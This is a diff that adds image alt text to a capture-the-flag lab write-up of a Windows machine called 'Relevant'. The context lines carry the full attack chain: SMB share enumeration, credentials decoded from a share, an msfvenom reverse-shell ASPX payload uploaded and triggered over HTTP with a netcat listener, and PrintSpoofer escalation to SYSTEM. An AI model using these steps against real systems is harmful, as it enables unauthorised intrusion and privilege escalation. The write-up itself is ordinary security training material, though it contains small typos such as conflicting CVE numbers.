@@ -39,9 +39,9 @@ nmap -A -p- TARGET -Pn --min-rate 10000 -oN relevant.nmap
 | 49667    | rpc         |
 | 49669    | rpc         |
 
-![](https://cdn.ziomsec.com/relevant/1.webp)
+![performing an nmap scan on relevant machine](https://cdn.ziomsec.com/relevant/1.webp)
 
-![](https://cdn.ziomsec.com/relevant/2.webp)
+![performing an nmap scan on relevant machine](https://cdn.ziomsec.com/relevant/2.webp)
 
 I also ran a vulnerability scan on **smb** using **nmap** and found it was vulnerable to **CVE-2017-0143**
 
@@ -49,12 +49,13 @@ I also ran a vulnerability scan on **smb** using **nmap** and found it was vulne
 nmap --script vuln -p 445,139 TARGET
 ```
 
-![](https://cdn.ziomsec.com/relevant/3.webp)
+![running a vulnerability scan on smb via nmap](https://cdn.ziomsec.com/relevant/3.webp)
+
 ## Initial Foothold
 
 I accessed the two **http** servers revealed by **nmap** scan and found a default IIS landing page.
 
-![](https://cdn.ziomsec.com/relevant/4.webp)
+![accessing the web application](https://cdn.ziomsec.com/relevant/4.webp)
 
 Since the **http** pages had nothing interesting, I enumerated **smb** and found an interesting share.
 
@@ -62,7 +63,7 @@ Since the **http** pages had nothing interesting, I enumerated **smb** and found
 smbclient -L TARGET
 ```
 
-![](https://cdn.ziomsec.com/relevant/5.webp)
+![listing the smb shares](https://cdn.ziomsec.com/relevant/5.webp)
 
 I connected to the share and found a password file.
 
@@ -70,11 +71,11 @@ I connected to the share and found a password file.
 smbclient //TARGET/nt4wrksv -N
 ```
 
-![](https://cdn.ziomsec.com/relevant/6.webp)
+![connecting to the smb share](https://cdn.ziomsec.com/relevant/6.webp)
 
 This file contained base64 encoded credentials.
 
-![](https://cdn.ziomsec.com/relevant/7.webp)
+![decoding the base64 encoded creds](https://cdn.ziomsec.com/relevant/7.webp)
 
 I tried using them to get access using rdp but failed. I then looked into the vulnerability that I had found earlier while reconnaissance.
 - https://nvd.nist.gov/vuln/detail/cve-2017-0413
@@ -85,11 +86,11 @@ The vulnerability lead to remote code execution. So to exploit it, I created an 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGET LPORT=8080 -f apsx -o exploit.aspx
 ```
 
-![](https://cdn.ziomsec.com/relevant/8.webp)
+![generating a reverse shell payload](https://cdn.ziomsec.com/relevant/8.webp)
 
 I then uploaded the payload on the **smb** share that I had discovered earlier.
 
-![](https://cdn.ziomsec.com/relevant/9.webp)
+![uploading the reverse shell payload](https://cdn.ziomsec.com/relevant/9.webp)
 
 From my past experience, I found that sometimes smb shares are hosted on the web server. I tried accessing the share on both the servers and succeeded on the one running on port **49663**. I then started a **netcat** listener and executed the payload through **http** to get a reverse shell.
 
@@ -101,7 +102,7 @@ curl http://TARGET:49663/nt4wrksv/exploit.aspx
 rlwrap nc -lvp PORT
 ```
 
-![](https://cdn.ziomsec.com/relevant/10.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/relevant/10.webp)
 
 With shell access, I was able to capture the user flag from *Bob*'s Desktop.
 
@@ -109,7 +110,7 @@ With shell access, I was able to capture the user flag from *Bob*'s Desktop.
 more c:\Users\Bob\Desktop\user.txt
 ```
 
-![](https://cdn.ziomsec.com/relevant/11.webp)
+![capturing the user flag](https://cdn.ziomsec.com/relevant/11.webp)
 
 ## Privilege Escalation
 
@@ -121,7 +122,7 @@ However, I found nothing interesting. Next I looked at my privileges and found I
 whoami /priv
 ```
 
-![](https://cdn.ziomsec.com/relevant/12.webp)
+![checking user privs](https://cdn.ziomsec.com/relevant/12.webp)
 
 Users with this privilege enabled could potentially escalate to admin using **dirty potato** or **spoolspoof** exploits. I referred to the below article and downloaded the **printspoofer** exploit.
 - https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/
@@ -134,7 +135,7 @@ Finally, I used the exploit to get NT Authority/System access on the target
 PrintSpoofer64.exe -i -c powershell.exe
 ```
 
-![](https://cdn.ziomsec.com/relevant/13.webp)
+![gaining NT Authority/System access](https://cdn.ziomsec.com/relevant/13.webp)
 
 I then captured the root flag from *Administrator*'s Desktop.
 
@@ -142,7 +143,7 @@ I then captured the root flag from *Administrator*'s Desktop.
 more C:\Users\Administrator\Desktop\root.txt
 ```
 
-![](https://cdn.ziomsec.com/relevant/14.webp)
+![capturing the root flag](https://cdn.ziomsec.com/relevant/14.webp)
 
 ## Closure
 
